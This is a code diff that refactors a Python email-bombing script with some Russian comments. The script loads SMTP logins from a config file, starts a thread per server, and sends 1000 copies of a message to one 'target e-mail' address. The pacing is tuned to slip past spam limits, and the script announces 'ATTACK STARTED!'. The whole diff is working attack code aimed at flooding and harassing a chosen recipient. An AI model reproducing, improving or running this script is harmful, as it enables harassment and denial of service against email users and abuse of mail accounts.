@@ -9,30 +9,30 @@ from colorama import init, Fore
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-# Заголовок, сообщение
-MESSAGE = [ "", "" ]
-    
-THREADS = []
+def PrintError(message):
+    print(f"[{Fore.RED}!{Fore.WHITE}] {message}")
 
-def startServer(infoSMTP, emailFrom, emailPassword, emailTo):
-    # Подключаемся к SMTP-серверу, используя нашу учётную запись
-    server = smtplib.SMTP(infoSMTP)
+def PrintMessage(message):
+    print(f"[{Fore.YELLOW}#{Fore.WHITE}] {message}")
+
+def StartServer(detailsSMTP, emailMessage):
+    # Using details for login
+    server = smtplib.SMTP(detailsSMTP[0])
     server.starttls()
-    server.login(emailFrom, emailPassword)
+    server.login(detailsSMTP[1], detailsSMTP[2])
 
-    # Насколько выяснил, большинство спам-фильтров дают ограничение в 1000 сообщений
-    # с одного аккаунта - будем иметь ввиду
     msg = MIMEMultipart()
+    # <= 1000 messages - antispam defender
     for i in range(0, 1000):
-        # Подготавливаем сообщение (содержимое - титульник и сам текст)
-        msg["Subject"] = MESSAGE[0]
-        msg.attach(MIMEText(MESSAGE[1], "plain"))
+        # Prepare message
+        msg["Subject"] = emailMessage[0]
+        msg.attach(MIMEText(emailMessage[1], "plain"))
         
-        # Отправляем сообщения
+        # Send message via SMTP
         try:
-            server.sendmail(emailFrom, emailTo, msg.as_string())
+            server.sendmail(detailsSMTP[1], emailMessage[2], msg.as_string())
         except:
-            print(f"[{Fore.RED}!{Fore.WHITE}] SMTP error: unknown error!")
+            PrintError("SMTP error: unknown error!")
         
         # Опытным путём выяснил: стоит делать паузу в 2 секунды
         time.sleep(2)
@@ -40,88 +40,89 @@ def startServer(infoSMTP, emailFrom, emailPassword, emailTo):
     # Освобождаем ресурсы
     server.quit()
     
-def loadSMTP(configPath, emailTo):
-    parser = None
-    
-    # Открываем сам конфиг
+def InitSMTP(configPath, emailMessage):
+    # Try to open config file
     try:
         parser = ConfigParser()
         parser.read(configPath)
     except:
-        print(f"[{Fore.RED}!{Fore.WHITE}] Parser error: file {configPath} not found/is broken!")
+        PrintError("Parser error: file {configPath} not found/is broken!")
         return False
     
-    # Итерация секций в файле, название - не так важно
-    infoSMTP = ""
-    emailFrom = ""
-    emailPassword = ""
+    threads = []
+    detailsSMTP = [ "", "", "" ]
+
+    # Get SMTP details from config
     for section in parser.sections():
-        # Пробуем получить необходимую информацию из секции
         try:
-            infoSMTP = parser.get(section, "SMTP")
-            emailFrom = parser.get(section, "MAIL_FROM")
-            emailPassword = parser.get(section, "MAIL_PASSWORD")
+            detailsSMTP[0] = parser.get(section, "SMTP")
+            detailsSMTP[1] = parser.get(section, "MAIL_FROM")
+            detailsSMTP[2] = parser.get(section, "MAIL_PASSWORD")
         except:
-            print(f"[{Fore.RED}!{Fore.WHITE}] Parser error: incorrect details!")
+            PrintError("Parser error: incorrect details!")
             return False
         
-        # Пробуем подготовить дополнительный поток под сервер
-        print(f"[{Fore.YELLOW}#{Fore.WHITE}] Current SMTP: {Fore.YELLOW}{infoSMTP}")
+        # Prepare threads
+        PrintMessage(f"Current SMTP: {Fore.YELLOW}{detailsSMTP[0]}{Fore.WHITE}")
         try:
-            THREADS.append(threading.Thread(target = startServer, 
-                args = (infoSMTP, emailFrom, emailPassword, emailTo, )))
+            threads.append(threading.Thread(target = StartServer, 
+                args = (detailsSMTP, emailMessage, )))
         except:
-            print(f"[{Fore.RED}!{Fore.WHITE}] SMTP error: unknown error!")
+            PrintError("SMTP error: unknown error!")
             return False
             
-    return True
+    return threads
 
-def main(configPath = "SMTP.ini"):
-    # Хак под Windows 10 & Windows 11 для корректной отрисовки цветов шрифтов
+def main():
+    # Windows 10-11 color text fix
     init(autoreset = True)
 
+    # Console arguments count
     argsLen = len(sys.argv)
     
-    # Путь до конфиг-файла
+    # Config path (ex: SMTP.ini)
     if argsLen > 1:
         configPath = str(sys.argv[1])
+    else:
+        configPath = "SMTP.ini"
+
+    # E-mail message details (title, text, target)
+    emailMessage = [ "", "", "" ]
         
     # Заголовок сообщения
     if argsLen > 2:
-        MESSAGE[0] = str(sys.argv[2])
+        emailMessage[0] = str(sys.argv[2])
     else:
-        print(f"[{Fore.YELLOW}#{Fore.WHITE}] Enter a e-mail title: ")
-        MESSAGE[0] = input()
+        PrintMessage("Enter a e-mail title: ")
+        emailMessage[0] = input()
     
     # Исходный текст сообщения
     if argsLen > 3:
-        MESSAGE[1] = str(sys.argv[3])
+        emailMessage[1] = str(sys.argv[3])
     else:
-        print(f"[{Fore.YELLOW}#{Fore.WHITE}] Enter a e-mail message: ")
-        MESSAGE[1] = input()
+        PrintMessage("Enter a message: ")
+        emailMessage[1] = input()
         
-    # Жертва
-    emailTo = ""
     if argsLen > 4:
-        emailTo = str(sys.argv[4])
+        emailMessage[2] = str(sys.argv[4])
     else:
-        # Здесь могла быть проверка на корректный E-mail, однако...
+        # Regex not needed
         # (https://davidcel.is/posts/stop-validating-email-addresses-with-regex/)
-        print(f"[{Fore.YELLOW}#{Fore.WHITE}] Enter a target email: ")
-        emailTo = input()
+        PrintMessage("Enter a target e-mail: ")
+        emailMessage[2] = input()
     
-    print(f"[{Fore.YELLOW}#{Fore.WHITE}] Loading a SMTP servers...")
-    if (loadSMTP(configPath, emailTo) == False):
+    # Prepare threads array
+    PrintMessage("Loading a SMTP servers...")
+    threads = InitSMTP(configPath, emailMessage)
+    if threads == False or len(threads) <= 0:
+        PrintError("Can't find any working SMTP server")
         return
     
-    # Включаемся в работу и синхронизируем потоки перед выходом
-    if (len(THREADS) > 0):
-        print(f"[{Fore.YELLOW}#{Fore.WHITE}] {Fore.GREEN}ATTACK STARTED!")
-        for i in THREADS:
-            i.start()
-            i.join()
-    else:
-        print(f"[{Fore.YELLOW}#{Fore.WHITE}] {Fore.RED}WORKING SMTP SERVERS NOT FOUND!")
+    # Run and sync threads
+    PrintMessage(f"{Fore.GREEN}ATTACK STARTED!{Fore.WHITE}")
+    for it in threads:
+        it.start()
+        it.join()
 
 if __name__ == "__main__":
     main()
